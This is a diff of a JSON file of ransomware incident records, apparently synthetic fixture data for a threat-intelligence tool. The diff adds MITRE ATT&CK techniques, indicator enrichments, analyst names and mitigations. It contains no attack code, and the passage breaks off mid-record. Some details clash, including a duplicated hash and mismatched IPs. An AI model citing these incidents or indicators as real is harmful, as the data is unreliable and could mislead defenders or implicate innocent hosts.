@@ -3,8 +3,10 @@
     "incident_id": "INC-2026-001",
     "threat_name": "LOCKBIT4-RANSOMWARE",
     "severity": "CRITICAL",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-LOCKBIT4-2026",
     "created_at": "2026-05-18T02:14:33Z",
+    "updated_at": "2026-05-18T14:14:33Z",
     "indicators": [
       "hash:a3f8e2b1c94d7f60e5a2b8c3d1e4f709a8b2c5d6e7f1a2b3c4d5e6f7a8b9c0d1",
       "domain:cdn-update-check.systems",
@@ -12,14 +14,74 @@
       "mutex:LockBit4_Global_RunOnce_Mutex",
       "process:svchost_ldr.exe",
       "registry:HKLM\\SOFTWARE\\LockBit\\Config"
-    ]
+    ],
+    "confidence_score": 0.91,
+    "risk_score": 0.94,
+    "attribution_confidence": 0.88,
+    "suspected_actor": "LOCKBIT4",
+    "attack_techniques": [
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      },
+      {
+        "technique_id": "T1490",
+        "technique_name": "Inhibit System Recovery",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1490"
+      },
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      },
+      {
+        "technique_id": "T1133",
+        "technique_name": "External Remote Services",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1133"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1055",
+        "technique_name": "Process Injection",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1055"
+      }
+    ],
+    "description": "LockBit 4.0 ransomware deployed across 47 hospital endpoints. Encryption active on file shares; C2 callback observed to cdn-update-check.systems. Patient data and backup systems at risk.",
+    "assigned_analyst": "Sarah Kim",
+    "ioc_enrichments": "hash:a3f8e2... [MALWARE_HASH conf=0.95] | domain:cdn-update-check.systems [C2_DOMAIN conf=0.93] | ip:91.234.99.107 [C2_IP conf=0.91]",
+    "mitigation_actions": "Isolate affected hosts, block C2 domain, disable VPN access, engage ransomware IR team",
+    "threat_summary": "LockBit 4.0 RaaS affiliate attack on healthcare network. Double-extortion in progress with dedicated leak site.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 38
+    }
   },
   {
     "incident_id": "INC-2026-002",
     "threat_name": "BLACKCAT-ALPHV-RANSOMWARE",
     "severity": "CRITICAL",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-BLACKCAT-2026",
     "created_at": "2026-05-19T08:47:12Z",
+    "updated_at": "2026-05-19T20:47:12Z",
     "indicators": [
       "hash:b7c4f1a9e2d8b3c6f0e9a1d4b7c2e5f8a3d6b9c0e3f6a9b2c5d8e1f4a7b0c3d6",
       "domain:alphv-exfil-node.icu",
@@ -27,14 +89,67 @@
       "ip:185.62.188.88",
       "process:encryptor64.exe",
       "file:RECOVER-FILES.txt"
-    ]
+    ],
+    "confidence_score": 0.89,
+    "risk_score": 0.92,
+    "attribution_confidence": 0.85,
+    "suspected_actor": "ALPHV-BLACKCAT",
+    "attack_techniques": [
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      },
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      },
+      {
+        "technique_id": "T1078.002",
+        "technique_name": "Valid Accounts: Domain Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078/002"
+      },
+      {
+        "technique_id": "T1059.003",
+        "technique_name": "Command and Scripting: Windows Command Shell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/003"
+      },
+      {
+        "technique_id": "T1027",
+        "technique_name": "Obfuscated Files or Information",
+        "tactic": "defense-evasion",
+        "tactic_id": "TA0005",
+        "url": "https://attack.mitre.org/techniques/T1027"
+      }
+    ],
+    "description": "ALPHV/BlackCat Rust-based ransomware in energy sector OT-adjacent environment. 2.4 TB data staged via ExMatter. Double-extortion posture confirmed.",
+    "assigned_analyst": "James Okafor",
+    "ioc_enrichments": "hash:b7c4f1... [MALWARE_HASH conf=0.93] | domain:alphv-exfil-node.icu [C2_DOMAIN conf=0.89] | ip:45.141.87.234 [C2_IP conf=0.88]",
+    "mitigation_actions": "Contain OT-adjacent segment, block ExMatter C2, revoke domain accounts, notify CISA",
+    "threat_summary": "ALPHV/BlackCat affiliate targeting energy operator. Rust ransomware with ExMatter exfiltration tool detected.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 27
+    }
   },
   {
     "incident_id": "INC-2026-003",
     "threat_name": "AKIRA-RANSOMWARE",
     "severity": "HIGH",
+    "status": "CONTAINED",
     "campaign_id": "CAMP-AKIRA-2026",
     "created_at": "2026-05-20T14:22:05Z",
+    "updated_at": "2026-05-22T02:22:05Z",
     "indicators": [
       "hash:d9e2f5b8c1a4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2",
       "domain:akira-data-leak.onion.ws",
@@ -42,14 +157,67 @@
       "extension:.akira",
       "file:akira_readme.txt",
       "process:akira_win.exe"
-    ]
+    ],
+    "confidence_score": 0.84,
+    "risk_score": 0.78,
+    "attribution_confidence": 0.76,
+    "suspected_actor": "AKIRA-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1133",
+        "technique_name": "External Remote Services",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1133"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1021/001"
+      },
+      {
+        "technique_id": "T1558.003",
+        "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1558/003"
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      }
+    ],
+    "description": "Akira ransomware initial access via Cisco SSL VPN credential abuse. Cobalt Strike deployed; Kerberoasting detected. Ransomware staged but not yet detonated.",
+    "assigned_analyst": "Marcus Webb",
+    "ioc_enrichments": "hash:d9e2f5... [MALWARE_HASH conf=0.91] | domain:akira-data-leak.onion.ws [LEAK_SITE conf=0.95] | ip:194.26.135.91 [C2_IP conf=0.85]",
+    "mitigation_actions": "Reset VPN credentials, block C2 IPs, remove Cobalt Strike beacon, patch Cisco VPN",
+    "threat_summary": "Akira ransomware pre-detonation containment. Cobalt Strike C2 dismantled before encryption.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 54
+    }
   },
   {
     "incident_id": "INC-2026-004",
     "threat_name": "PLAY-RANSOMWARE",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-PLAY-2026",
     "created_at": "2026-05-20T22:59:44Z",
+    "updated_at": "2026-05-23T22:59:44Z",
     "indicators": [
       "hash:e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3f6a9b2c5d8e1f4",
       "domain:play-ransomgroup-blog.net",
@@ -58,14 +226,67 @@
       "file:ReadMe.txt",
       "tool:AdFind.exe",
       "tool:Cobalt Strike"
-    ]
+    ],
+    "confidence_score": 0.82,
+    "risk_score": 0.74,
+    "attribution_confidence": 0.72,
+    "suspected_actor": "PLAY-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1190"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1021/001"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      }
+    ],
+    "description": "PLAY ransomware targeting government contractor via ProxyNotShell vulnerability. AdFind and SystemBC loader detected. Encryption initiated on shared drives.",
+    "assigned_analyst": "Aisha Patel",
+    "ioc_enrichments": "hash:e1f4a7... [MALWARE_HASH conf=0.89] | domain:play-ransomgroup-blog.net [LEAK_SITE conf=0.94] | ip:89.208.103.26 [C2_IP conf=0.82]",
+    "mitigation_actions": "Patch Exchange, isolate encrypted hosts, restore from backup, notify customers",
+    "threat_summary": "PLAY ransomware group attack via ProxyNotShell. Encryption partially mitigated via offline backup restoration.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 45
+    }
   },
   {
     "incident_id": "INC-2026-005",
     "threat_name": "RHYSIDA-RANSOMWARE",
     "severity": "CRITICAL",
+    "status": "CONTAINED",
     "campaign_id": "CAMP-RHYSIDA-2026",
     "created_at": "2026-05-21T05:33:18Z",
+    "updated_at": "2026-05-22T17:33:18Z",
     "indicators": [
       "hash:f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6",
       "domain:rhysida-data-dump.xyz",
@@ -74,28 +295,134 @@
       "tool:PsExec",
       "tool:Cobalt Strike",
       "process:rhysida.exe"
-    ]
+    ],
+    "confidence_score": 0.87,
+    "risk_score": 0.88,
+    "attribution_confidence": 0.83,
+    "suspected_actor": "RHYSIDA-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      },
+      {
+        "technique_id": "T1490",
+        "technique_name": "Inhibit System Recovery",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1490"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1567",
+        "technique_name": "Exfiltration Over Web Service",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1567"
+      }
+    ],
+    "description": "Rhysida ransomware across university research systems. 890 GB student and research data staged via WinSCP. Ransom demand \u00a33.2M. Backup restoration underway.",
+    "assigned_analyst": "Aisha Patel",
+    "ioc_enrichments": "hash:f3a6b9... [MALWARE_HASH conf=0.92] | domain:rhysida-data-dump.xyz [LEAK_SITE conf=0.96] | ip:46.161.27.151 [C2_IP conf=0.87]",
+    "mitigation_actions": "Isolate university network segments, block WinSCP exfil, coordinate with law enforcement, restore from backups",
+    "threat_summary": "Rhysida double-extortion against university. Data exfiltration detected before full encryption; ransom not paid.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 23
+    }
   },
   {
     "incident_id": "INC-2026-006",
     "threat_name": "LOCKBIT4-RANSOMWARE",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-LOCKBIT4-2026",
     "created_at": "2026-05-22T11:08:57Z",
+    "updated_at": "2026-05-25T11:08:57Z",
     "indicators": [
       "hash:a1b4c7d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4",
       "domain:api-update-secure.net",
       "ip:91.234.99.108",
       "mutex:LockBit4_VM_Check_Mutex",
       "file:!!!-Restore-My-Files-!!!.txt"
-    ]
+    ],
+    "confidence_score": 0.88,
+    "risk_score": 0.79,
+    "attribution_confidence": 0.86,
+    "suspected_actor": "LOCKBIT4",
+    "attack_techniques": [
+      {
+        "technique_id": "T1133",
+        "technique_name": "External Remote Services",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1133"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      },
+      {
+        "technique_id": "T1490",
+        "technique_name": "Inhibit System Recovery",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1490"
+      },
+      {
+        "technique_id": "T1562.001",
+        "technique_name": "Impair Defenses: Disable or Modify Tools",
+        "tactic": "defense-evasion",
+        "tactic_id": "TA0005",
+        "url": "https://attack.mitre.org/techniques/T1562/001"
+      }
+    ],
+    "description": "Second LockBit 4.0 incident targeting logistics company. VM-aware encryptor detected. VPN credential abuse as initial access vector. Ransom note dropped.",
+    "assigned_analyst": "Sarah Kim",
+    "ioc_enrichments": "hash:a1b4c7... [MALWARE_HASH conf=0.93] | domain:api-update-secure.net [C2_DOMAIN conf=0.91] | ip:91.234.99.108 [C2_IP conf=0.89]",
+    "mitigation_actions": "Revert VMs from snapshot, revoke VPN credentials, patch VPN, deploy deception endpoints",
+    "threat_summary": "LockBit 4.0 VM-aware variant targeting logistics VMware infrastructure.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 38
+    }
   },
   {
     "incident_id": "INC-2026-007",
     "threat_name": "BLACKCAT-ALPHV-RANSOMWARE",
     "severity": "CRITICAL",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-BLACKCAT-2026",
     "created_at": "2026-05-23T16:45:30Z",
+    "updated_at": "2026-05-28T16:45:30Z",
     "indicators": [
       "hash:c7d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0",
       "domain:secure-cdn-endpoint.io",
@@ -103,14 +430,67 @@
       "ip:45.141.87.199",
       "file:RECOVER-alpha.txt",
       "process:locker_windows.exe"
-    ]
+    ],
+    "confidence_score": 0.9,
+    "risk_score": 0.91,
+    "attribution_confidence": 0.87,
+    "suspected_actor": "ALPHV-BLACKCAT",
+    "attack_techniques": [
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      },
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      },
+      {
+        "technique_id": "T1027",
+        "technique_name": "Obfuscated Files or Information",
+        "tactic": "defense-evasion",
+        "tactic_id": "TA0005",
+        "url": "https://attack.mitre.org/techniques/T1027"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1560",
+        "technique_name": "Archive Collected Data",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1560"
+      }
+    ],
+    "description": "BlackCat/ALPHV affiliate used Brute Ratel C4 for post-exploitation. 1.8 TB data exfiltrated prior to encryption. Critical infrastructure notification issued.",
+    "assigned_analyst": "James Okafor",
+    "ioc_enrichments": "hash:c7d0e3... [MALWARE_HASH conf=0.94] | domain:secure-cdn-endpoint.io [C2_DOMAIN conf=0.90] | ip:77.105.163.47 [C2_IP conf=0.88]",
+    "mitigation_actions": "IR engagement complete, systems restored from backup, regulatory notifications filed",
+    "threat_summary": "ALPHV/BlackCat resolved after full IR engagement. Brute Ratel C4 removed, exfil path identified.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 27
+    }
   },
   {
     "incident_id": "INC-2026-008",
     "threat_name": "AKIRA-RANSOMWARE",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-AKIRA-2026",
     "created_at": "2026-05-24T09:17:23Z",
+    "updated_at": "2026-05-27T09:17:23Z",
     "indicators": [
       "hash:b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5b8c1",
       "domain:akira-exfil-backup.store",
@@ -118,14 +498,67 @@
       "extension:.akira",
       "tool:WinSCP",
       "tool:rclone"
-    ]
+    ],
+    "confidence_score": 0.83,
+    "risk_score": 0.76,
+    "attribution_confidence": 0.74,
+    "suspected_actor": "AKIRA-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1133",
+        "technique_name": "External Remote Services",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1133"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1567",
+        "technique_name": "Exfiltration Over Web Service",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1567"
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      }
+    ],
+    "description": "Akira ransomware second wave using WinSCP and rclone for data staging. Professional services firm targeted. VPN initial access confirmed.",
+    "assigned_analyst": "Marcus Webb",
+    "ioc_enrichments": "hash:b8c1d4... [MALWARE_HASH conf=0.90] | domain:akira-exfil-backup.store [C2_DOMAIN conf=0.87] | ip:179.60.147.201 [C2_IP conf=0.83]",
+    "mitigation_actions": "Block exfil tools, restore backup, reset credentials, patch Cisco VPN CVE",
+    "threat_summary": "Akira ransomware mitigated via backup restoration. rclone exfil to cloud storage disrupted.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 54
+    }
   },
   {
     "incident_id": "INC-2026-009",
     "threat_name": "REVIL-REVIVAL-RANSOMWARE",
     "severity": "CRITICAL",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-REVIL-2026",
     "created_at": "2026-05-25T03:55:09Z",
+    "updated_at": "2026-05-25T15:55:09Z",
     "indicators": [
       "hash:c9d2e5f8a1b4c7d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2",
       "domain:revil-darknet-blog.xyz",
@@ -135,14 +568,67 @@
       "file:readme_revil.txt",
       "tool:Mimikatz",
       "tool:Cobalt Strike"
-    ]
+    ],
+    "confidence_score": 0.86,
+    "risk_score": 0.89,
+    "attribution_confidence": 0.8,
+    "suspected_actor": "REVIL-SPINOFF",
+    "attack_techniques": [
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      },
+      {
+        "technique_id": "T1003.001",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1003/001"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1550",
+        "technique_name": "Use Alternate Authentication Material",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1550"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      }
+    ],
+    "description": "REvil revival variant encrypting finance sector endpoints. Mimikatz and Cobalt Strike in use. Ransom demand $4.5M in BTC. Leak site post imminent.",
+    "assigned_analyst": "Carlos Mendez",
+    "ioc_enrichments": "hash:c9d2e5... [MALWARE_HASH conf=0.91] | domain:revil-darknet-blog.xyz [LEAK_SITE conf=0.97] | ip:82.118.21.54 [C2_IP conf=0.86]",
+    "mitigation_actions": "Isolate finance VLAN, seize Cobalt Strike C2, dump and analyse encryptor, engage crypto negotiator",
+    "threat_summary": "REvil revival double-extortion in active IR phase. Negotiation team engaged.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 12
+    }
   },
   {
     "incident_id": "INC-2026-010",
     "threat_name": "PLAY-RANSOMWARE",
     "severity": "HIGH",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-PLAY-2026",
     "created_at": "2026-05-26T18:04:51Z",
+    "updated_at": "2026-05-31T18:04:51Z",
     "indicators": [
       "hash:d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3",
       "domain:play-leak-portal.onion.pet",
@@ -150,14 +636,67 @@
       "tool:SystemBC",
       "tool:Cobalt Strike",
       "process:playx64.exe"
-    ]
+    ],
+    "confidence_score": 0.81,
+    "risk_score": 0.73,
+    "attribution_confidence": 0.7,
+    "suspected_actor": "PLAY-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      },
+      {
+        "technique_id": "T1219",
+        "technique_name": "Remote Access Software",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1219"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1021/001"
+      }
+    ],
+    "description": "PLAY ransomware using SystemBC proxy and Cobalt Strike. MSP targeted. Encryption of managed endpoints across 5 client environments. Ransom paid by client.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "hash:d0e3f6... [MALWARE_HASH conf=0.88] | domain:play-leak-portal.onion.pet [LEAK_SITE conf=0.93] | ip:88.119.170.209 [C2_IP conf=0.80]",
+    "mitigation_actions": "IR complete, ransom paid, decryptor applied, IOCs distributed to MSP clients, credential rotation complete",
+    "threat_summary": "PLAY ransomware resolved post-payment. Full IR engagement and IOC distribution to affected MSP clients.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 45
+    }
   },
   {
     "incident_id": "INC-2026-011",
     "threat_name": "RHYSIDA-RANSOMWARE",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-RHYSIDA-2026",
     "created_at": "2026-05-27T07:29:37Z",
+    "updated_at": "2026-05-30T07:29:37Z",
     "indicators": [
       "hash:e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3f6a9b2c5d8e1f4",
       "domain:rhysida-exfil-staging.ru",
@@ -165,14 +704,67 @@
       "tool:PsExec",
       "tool:AnyDesk",
       "extension:.rhysida"
-    ]
+    ],
+    "confidence_score": 0.85,
+    "risk_score": 0.77,
+    "attribution_confidence": 0.79,
+    "suspected_actor": "RHYSIDA-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      },
+      {
+        "technique_id": "T1219",
+        "technique_name": "Remote Access Software",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1219"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1021.002",
+        "technique_name": "SMB/Windows Admin Shares",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1021/002"
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      }
+    ],
+    "description": "Rhysida second attack using PsExec and AnyDesk for lateral movement. Retail sector target. Data staged but encryption halted by EDR detection.",
+    "assigned_analyst": "Aisha Patel",
+    "ioc_enrichments": "hash:e1f4a7... [MALWARE_HASH conf=0.90] | domain:rhysida-exfil-staging.ru [C2_DOMAIN conf=0.88] | ip:91.92.241.157 [C2_IP conf=0.84]",
+    "mitigation_actions": "Remove AnyDesk, block PsExec execution, purge staged data, credential rotation",
+    "threat_summary": "Rhysida mitigated by EDR before encryption. Exfiltration path via rclone identified and blocked.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 23
+    }
   },
   {
     "incident_id": "INC-2026-012",
     "threat_name": "ICEFIRE-LINUX-RANSOMWARE",
     "severity": "MEDIUM",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-ICEFIRE-2026",
     "created_at": "2026-05-28T12:41:26Z",
+    "updated_at": "2026-06-02T12:41:26Z",
     "indicators": [
       "hash:f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5",
       "domain:icefire-payload-cdn.net",
@@ -180,14 +772,67 @@
       "extension:.ifire",
       "process:iFire",
       "file:README_FOR_RESTORE.txt"
-    ]
+    ],
+    "confidence_score": 0.72,
+    "risk_score": 0.55,
+    "attribution_confidence": 0.61,
+    "suspected_actor": "ICEFIRE-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1190"
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact",
+        "tactic": "impact",
+        "tactic_id": "TA0040",
+        "url": "https://attack.mitre.org/techniques/T1486"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1070.004",
+        "technique_name": "Indicator Removal: File Deletion",
+        "tactic": "defense-evasion",
+        "tactic_id": "TA0005",
+        "url": "https://attack.mitre.org/techniques/T1070/004"
+      }
+    ],
+    "description": "IceFire Linux ransomware targeting VMware ESXi servers. IBM Aspera Faspex vulnerability CVE-2022-47986 exploited for initial access. ESXi file system encrypted.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "hash:f2a5b8... [MALWARE_HASH conf=0.87] | domain:icefire-payload-cdn.net [C2_DOMAIN conf=0.84] | ip:5.188.87.61 [C2_IP conf=0.79]",
+    "mitigation_actions": "Patch CVE-2022-47986, restore ESXi VMs from backup, deploy Linux EDR agent",
+    "threat_summary": "IceFire Linux ransomware resolved. ESXi environment restored from offline backups.",
+    "enrichment_data": {
